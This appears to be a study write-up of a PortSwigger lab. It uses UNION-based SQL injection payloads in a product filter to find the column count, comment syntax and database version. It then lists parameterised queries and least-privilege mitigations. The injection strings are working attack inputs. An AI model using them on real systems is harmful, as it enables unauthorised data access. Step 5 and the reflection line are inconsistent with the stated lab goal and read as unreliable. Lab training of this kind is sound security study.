# SQL Injection - UNION Attack: querying the database type and version on MySQL and Microsoft

## Goal:
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

---

## Process

### 1. Intercepted the GET Request and Sent to Repeater (using Burp Suite)
```http
GET /filter?category=Gifts HTTP/2
```

### 2. Modified the Request to Determine Column Count

```sql
' UNION SELECT NULL--
```
Response: HTTP/2 500 Internal Server

```sql
' UNION SELECT NULL,NUL--
```
Response: HTTP/2 500 Internal Server

```sql
' UNION SELECT NULL,NULL#
```
Response: HTTP/2 200 OK

The server does not like the input `--`. The`#` was accepted instead. It is similar to `--` and comments out the rest.

`--` is standard SQL single-line comment. It requires space or newline after it. `#` is MySQL-specific single-line comment. It does not require a space after.

In this case the backend server is probably MySQL. 

When the query is commented out using `--` the SQL query becomes:

```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL--'
```

If there is no space after `--`, the trailing `'` is not commented out, and this causes a syntax error (hence 500 Internal Server Error). 

A space or `+` after the standard SQL single-line comment, `--` will also work as it adds an additional space which the standard SQL single-line comment requires.

```sql
' UNION SELECT NULL,NULL--+
```

### 3. Identified Column Accepting String Output

```sql
' UNION SELECT 'a','a'#
```
Response: HTTP/2 200 OK

### 4. Retrieved Database Version

```sql
' UNION SELECT @@version,NULL#
```
Response: HTTP/2 200 OK

![burpsuite response](./misc-images/07-1.png)

This retrieved the version of the database.

This command will differ based on database:
* Microsoft, MySQL -  SELECT @@version
* Oracle -    SELECT * FROM v$version
* PostgreSQL -	SELECT version()

### 5. Retrieved Data from Users Table

Logged in as the administrator using the password retrived.

---

## Mitigation

- Use parameterised queries (prepped statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.

Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#how-to-fix-this-vulnerability)

- Restrict database permissions: The application should connect using a low-privilege database account with access only to the necessary tables and operations. It should not have access to sensitive operations like `SELECT * FROM users`, `DROP`, `UPDATE`, `CREATE`, etc., unless absolutely required.

---

## Reflection

Learned how to retrieve multiple the version of database in MySQL.

---

## Notes

